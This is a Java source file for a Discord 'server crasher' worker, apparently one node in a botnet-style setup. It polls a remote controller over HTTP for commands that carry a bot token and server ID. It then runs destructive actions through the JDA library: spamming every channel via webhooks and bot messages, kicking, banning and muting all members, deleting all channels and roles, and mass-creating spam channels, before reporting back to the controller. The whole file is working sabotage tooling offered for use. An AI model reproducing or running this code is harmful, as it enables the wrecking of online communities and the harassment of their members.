package CrAsHeR.proxy;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class ProxyWorker {
    private static final HttpClient client = HttpClient.newHttpClient();
    private static String proxyUrl;
    private static final String WORKER_ID = UUID.randomUUID().toString().substring(0, 8);
    
    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: java ProxyWorker <raspberry_pi_ip>");
            return;
        }
        
        proxyUrl = "http://" + args[0] + ":8080";
        
        System.out.println("╔════════════════════════════════════╗");
        System.out.println("║   PROXY WORKER - ПК ПОМОЩНИК       ║");
        System.out.println("╚════════════════════════════════════╝");
        System.out.println("[*] Worker ID: " + WORKER_ID);
        System.out.println("[*] Подключение к: " + proxyUrl);
        System.out.println();
        
        while (true) {
            try {
                String command = getCommand();
                
                if (!"NONE".equals(command)) {
                    System.out.println("[+] Получена команда: " + command);
                    executeCommand(command);
                }
                
                Thread.sleep(2000);
            } catch (Exception e) {
                System.out.println("[✗] Ошибка: " + e.getMessage());
            }
        }
    }
    
    private static String getCommand() throws Exception {
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(proxyUrl + "/get"))
            .GET()
            .build();
        
        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
        return response.body();
    }
    
    private static void executeCommand(String command) {
        try {
            String[] parts = command.split("\\|");
            String cmd = parts[0];
            String token = parts[1];
            String guildId = parts[2];
            
            JDA jda = JDABuilder.createDefault(token)
                .enableIntents(GatewayIntent.GUILD_MEMBERS, GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT)
                .build()
                .awaitReady();
            
            Guild guild = jda.getGuildById(guildId);
            
            if (guild == null) {
                sendResult("Сервер не найден");
                return;
            }
            
            switch (cmd) {
                case "1":
                    spamWebhooks(guild);
                    break;
                case "2":
                    spamBot(guild);
                    break;
                case "3":
                    kickAll(guild);
                    break;
                case "4":
                    banAll(guild);
                    break;
                case "5":
                    deleteChannels(guild);
                    break;
                case "6":
                    deleteAllRoles(guild);
                    break;
                case "7":
                    muteAll(guild);
                    break;
                case "8":
                    massCreateChannels(guild);
                    break;
            }
            
            jda.shutdown();
            sendResult("Команда выполнена");
        } catch (Exception e) {
            sendResult("Ошибка: " + e.getMessage());
        }
    }
    
    private static void spamWebhooks(Guild guild) {
        System.out.println("[*] Спам через вебхуки...");
        for (TextChannel channel : guild.getTextChannels()) {
            channel.createWebhook("Spam").queue(webhook -> {
                for (int i = 0; i < 10; i++) {
                    webhook.sendMessage("Spam by Worker " + WORKER_ID).queue();
                    try { Thread.sleep(1000); } catch (InterruptedException e) {}
                }
                webhook.delete().queue();
            });
        }
    }
    
    private static void spamBot(Guild guild) {
        System.out.println("[*] Спам от бота...");
        for (int i = 0; i < 10; i++) {
            for (TextChannel channel : guild.getTextChannels()) {
                channel.sendMessage("Spam by Worker " + WORKER_ID).queue();
            }
            try { Thread.sleep(1000); } catch (InterruptedException e) {}
        }
    }
    
    private static void kickAll(Guild guild) {
        System.out.println("[*] Кик всех участников...");
        guild.loadMembers().onSuccess(members -> {
            for (Member member : members) {
                if (member.getUser().isBot() || member.isOwner()) continue;
                member.kick().queue();
                try { Thread.sleep(1000); } catch (InterruptedException e) {}
            }
        });
    }
    
    private static void banAll(Guild guild) {
        System.out.println("[*] Бан всех участников...");
        guild.loadMembers().onSuccess(members -> {
            for (Member member : members) {
                if (member.getUser().isBot() || member.isOwner()) continue;
                member.ban(0, TimeUnit.DAYS).queue();
                try { Thread.sleep(1000); } catch (InterruptedException e) {}
            }
        });
    }
    
    private static void deleteChannels(Guild guild) {
        System.out.println("[*] Удаление каналов...");
        for (TextChannel channel : guild.getTextChannels()) {
            channel.delete().queue();
            try { Thread.sleep(500); } catch (InterruptedException e) {}
        }
    }
    
    private static void deleteAllRoles(Guild guild) {
        System.out.println("[*] Удаление всех ролей...");
        for (Role role : guild.getRoles()) {
            if (!role.isManaged() && !role.isPublicRole()) {
                role.delete().queue();
                try { Thread.sleep(500); } catch (InterruptedException e) {}
            }
        }
    }
    
    private static void muteAll(Guild guild) {
        System.out.println("[*] Мут всех участников...");
        guild.loadMembers().onSuccess(members -> {
            for (Member member : members) {
                if (member.getUser().isBot() || member.isOwner()) continue;
                member.timeoutFor(java.time.Duration.ofHours(1)).queue();
                try { Thread.sleep(1000); } catch (InterruptedException e) {}
            }
        });
    }
    
    private static void massCreateChannels(Guild guild) {
        System.out.println("[*] Массовое создание каналов...");
        for (int i = 0; i < 50; i++) {
            guild.createTextChannel("spam-" + WORKER_ID + "-" + i).queue();
            try { Thread.sleep(500); } catch (InterruptedException e) {}
        }
    }
    
    private static void sendResult(String result) {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(proxyUrl + "/result"))
                .header("Worker-ID", WORKER_ID)
                .POST(HttpRequest.BodyPublishers.ofString(result))
                .build();
            
            client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println("[✓] Результат отправлен");
        } catch (Exception e) {
            System.out.println("[✗] Ошибка отправки результата");
        }
    }
}
